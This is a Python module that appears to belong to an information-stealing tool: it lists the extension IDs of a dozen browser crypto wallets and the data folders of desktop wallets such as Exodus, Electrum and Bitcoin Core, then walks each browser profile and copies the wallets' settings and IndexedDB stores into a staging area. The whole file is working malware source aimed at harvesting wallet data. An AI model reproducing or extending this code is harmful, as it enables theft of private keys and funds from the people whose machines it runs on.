"""Crypto wallet data from browser extensions and desktop clients."""

import glob
import os

from .browsers import ROOTS, profile_dirs
from .util import APPDATA

EXTENSIONS = {
    "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "TronLink": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
    "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
    "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
    "Nami": "lpfcbjknijpeeillifnkikgncikgfhbd",
    "Rabby": "acmacodkjbdgmoleebolmdjonilkdbch",
    "Trust": "egjidjbpglichdcondbcbdnbeeppgdph",
    "Solflare": "bhhhlbepdkbapadjdnnojkbgioiodbic",
    "MathWallet": "afbcbjpbpfanbmjdmbagnafnfhihdkmf",
}

DESKTOP = [
    ("exodus", os.path.join(APPDATA, "Exodus", "exodus.wallet")),
    ("electrum", os.path.join(APPDATA, "Electrum", "wallets")),
    ("atomic", os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")),
    ("coinomi", os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")),
    ("wasabi", os.path.join(APPDATA, "WalletWasabi", "Client", "Wallets")),
    ("sparrow", os.path.join(APPDATA, "Sparrow", "wallets")),
    ("bitcoin", os.path.join(APPDATA, "Bitcoin", "wallets")),
    ("litecoin", os.path.join(APPDATA, "Litecoin", "wallets")),
    ("dogecoin", os.path.join(APPDATA, "Dogecoin", "wallets")),
    ("guarda", os.path.join(APPDATA, "Guarda")),
]


def extract(stage):
    for browser, root in ROOTS:
        if not os.path.isdir(root):
            continue
        for profile in profile_dirs(root):
            for wallet, extension_id in EXTENSIONS.items():
                settings = os.path.join(profile, "Local Extension Settings", extension_id)
                stage.add_tree(
                    "wallets", settings, os.path.join(browser, wallet, "settings")
                )
                for pattern in (
                    "chrome-extension_%s_*.indexeddb.leveldb",
                    "chrome-extension_%s_*.indexeddb.blob",
                ):
                    for path in glob.glob(
                        os.path.join(profile, "IndexedDB", pattern % extension_id)
                    ):
                        stage.add_tree(
                            "wallets",
                            path,
                            os.path.join(browser, wallet, os.path.basename(path)),
                        )
    for label, path in DESKTOP:
        stage.add_tree("wallets", path, label)
